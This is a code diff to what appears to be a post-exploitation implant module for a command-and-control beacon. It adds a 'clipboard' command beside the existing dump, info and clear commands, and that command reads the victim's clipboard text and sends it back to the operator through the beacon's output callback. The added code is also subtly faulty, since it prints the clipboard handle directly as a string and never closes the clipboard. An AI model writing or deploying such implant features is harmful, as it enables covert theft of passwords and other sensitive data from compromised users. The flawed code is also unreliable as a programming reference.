@@ -249,6 +249,21 @@ VOID dump() {
     }
 }
 
+void clipboard(){
+    //
+    // open the clipboard
+    //
+    if ( USER32$OpenClipboard( NULL ) ){
+        //
+        // get what's in the clipboard
+        //
+        HANDLE Text = USER32$GetClipboardData( CF_TEXT );
+        BeaconPrintf( CALLBACK_OUTPUT, "%s", Text );
+    } else {
+        BeaconPrintf( CALLBACK_ERROR, "GetClipboardData failed with error: %d", NtLastError() );
+    }
+}
+
 VOID go(
     IN PCHAR args,
     IN ULONG argc
@@ -267,6 +282,8 @@ VOID go(
         stop();
     } else if ( StringCompareA( command, "dump" ) ) {
         dump();
+    } else if ( StringCompareA( command, "clipboard" ) ) {
+        clipboard();
     } else if ( StringCompareA( command, "info" ) ) {
         info();
     } else if ( StringCompareA( command, "clear" ) ) {
